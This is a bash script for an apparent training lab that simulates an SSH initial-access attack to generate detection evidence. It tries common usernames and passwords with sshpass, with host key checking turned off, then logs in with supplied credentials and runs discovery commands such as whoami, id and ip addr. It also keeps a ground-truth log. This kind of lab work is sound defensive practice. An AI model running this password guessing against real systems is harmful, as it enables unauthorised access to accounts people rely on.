#!/bin/bash

# ============================================================
# Nordic Manufacturing A/S - Attack Simulation
# Phase 03 - Authentication / Initial Access
#
# Purpose:
#   Generate controlled SSH authentication activity:
#
#     1. Failed SSH login attempts
#     2. Successful SSH login
#     3. Basic post-login discovery
#
# Evidence:
#   - Failed SSH authentication
#   - Multiple usernames
#   - Successful SSH authentication
#   - Remote session
#   - Commands executed after login
#
# IMPORTANT:
#   Intended for the Nordic Manufacturing CyberLab only.
# ============================================================

set -u

BASE_DIR="/opt/nordic-attack"
LOG_DIR="$BASE_DIR/logs"

mkdir -p "$LOG_DIR"

TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
LOGFILE="$LOG_DIR/auth-$TIMESTAMP.log"
GROUNDTRUTH="$LOG_DIR/incident-ground-truth.log"


# ------------------------------------------------------------
# Functions
# ------------------------------------------------------------

log_event() {
    echo "$(date --iso-8601=seconds) | AUTH | $1" >> "$GROUNDTRUTH"
}

banner() {
    clear
    echo "============================================================"
    echo "       NORDIC MANUFACTURING - AUTH ATTACK"
    echo "============================================================"
    echo
}


# ------------------------------------------------------------
# Check dependencies
# ------------------------------------------------------------

if ! command -v ssh >/dev/null 2>&1; then
    echo "[ERROR] ssh client is not installed."
    exit 1
fi

if ! command -v sshpass >/dev/null 2>&1; then
    echo "[ERROR] sshpass is not installed."
    echo
    echo "Install with:"
    echo "  sudo apt install sshpass"
    exit 1
fi


# ------------------------------------------------------------
# Start
# ------------------------------------------------------------

banner

echo "This simulation generates failed and successful"
echo "SSH authentication events against a CyberLab host."
echo

read -rp "Target IP: " TARGET


# ------------------------------------------------------------
# Validate IPv4
# ------------------------------------------------------------

if [[ -z "$TARGET" ]]; then
    echo "[ERROR] No target specified."
    exit 1
fi

if ! [[ "$TARGET" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
    echo "[ERROR] Invalid IPv4 address."
    exit 1
fi

IFS='.' read -r o1 o2 o3 o4 <<< "$TARGET"

for octet in "$o1" "$o2" "$o3" "$o4"; do
    if (( octet < 0 || octet > 255 )); then
        echo "[ERROR] Invalid IPv4 address."
        exit 1
    fi
done


# ------------------------------------------------------------
# Credentials for successful compromise simulation
# ------------------------------------------------------------

echo
read -rp "Valid SSH username: " VALID_USER
read -rsp "Valid SSH password: " VALID_PASSWORD
echo

if [[ -z "$VALID_USER" || -z "$VALID_PASSWORD" ]]; then
    echo
    echo "[ERROR] Username/password cannot be empty."
    exit 1
fi


echo
echo "Target: $TARGET"
echo "User:   $VALID_USER"
echo

log_event "Authentication attack started against $TARGET"


{
    echo "============================================================"
    echo "Nordic Manufacturing - Authentication Attack"
    echo "============================================================"
    echo
    echo "Time:   $(date --iso-8601=seconds)"
    echo "Source: $(hostname)"
    echo "Target: $TARGET"
    echo "User:   $VALID_USER"
    echo
} >> "$LOGFILE"


# ------------------------------------------------------------
# Phase 1 - Failed SSH attempts
# ------------------------------------------------------------

echo "[1/3] Generating failed SSH authentication attempts..."

FAILED_USERS=(
    "admin"
    "administrator"
    "backup"
    "support"
    "service"
)

FAILED_PASSWORD="Winter2026!"

for USERNAME in "${FAILED_USERS[@]}"; do

    echo "      Trying user: $USERNAME"

    log_event "Failed SSH attempt against $TARGET using username $USERNAME"

    sshpass -p "$FAILED_PASSWORD" \
        ssh \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no \
        -o ConnectTimeout=5 \
        -o NumberOfPasswordPrompts=1 \
        "$USERNAME@$TARGET" \
        "exit" >> "$LOGFILE" 2>&1 || true

    sleep 2

done


# ------------------------------------------------------------
# Extra attempts against the valid username
# ------------------------------------------------------------

echo
echo "[2/3] Attempting password guesses against valid account..."

for PASSWORD in \
    "Password123!" \
    "Welcome2026!" \
    "Company2026!"
do

    echo "      Password guess against: $VALID_USER"

    log_event "Password guess against $VALID_USER@$TARGET"

    sshpass -p "$PASSWORD" \
        ssh \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no \
        -o ConnectTimeout=5 \
        -o NumberOfPasswordPrompts=1 \
        "$VALID_USER@$TARGET" \
        "exit" >> "$LOGFILE" 2>&1 || true

    sleep 2

done


# ------------------------------------------------------------
# Phase 3 - Successful authentication
# ------------------------------------------------------------

echo
echo "[3/3] Performing successful authentication..."

log_event "Successful SSH authentication attempted as $VALID_USER against $TARGET"

sshpass -p "$VALID_PASSWORD" \
    ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    -o ConnectTimeout=5 \
    "$VALID_USER@$TARGET" \
    '
        echo "===== POST LOGIN DISCOVERY ====="
        echo
        echo "[whoami]"
        whoami
        echo
        echo "[hostname]"
        hostname
        echo
        echo "[id]"
        id
        echo
        echo "[network]"
        ip addr
        echo
        echo "[logged in users]"
        who
    ' >> "$LOGFILE" 2>&1

SSH_RESULT=$?


# ------------------------------------------------------------
# Result
# ------------------------------------------------------------

if [[ "$SSH_RESULT" -eq 0 ]]; then

    log_event "Successful SSH session established as $VALID_USER on $TARGET"

    echo
    echo "[+] Successful SSH session established."

else

    log_event "Successful SSH simulation FAILED against $TARGET"

    echo
    echo "[ERROR] Valid SSH login failed."
    echo "Check username/password and SSH configuration."

fi


# ------------------------------------------------------------
# Finish
# ------------------------------------------------------------

log_event "Authentication phase completed against $TARGET"

echo
echo "============================================================"
echo " Authentication simulation completed"
echo "============================================================"
echo
echo "Target:"
echo "  $TARGET"
echo
echo "Attack log:"
echo "  $LOGFILE"
echo
echo "Ground truth:"
echo "  $GROUNDTRUTH"
echo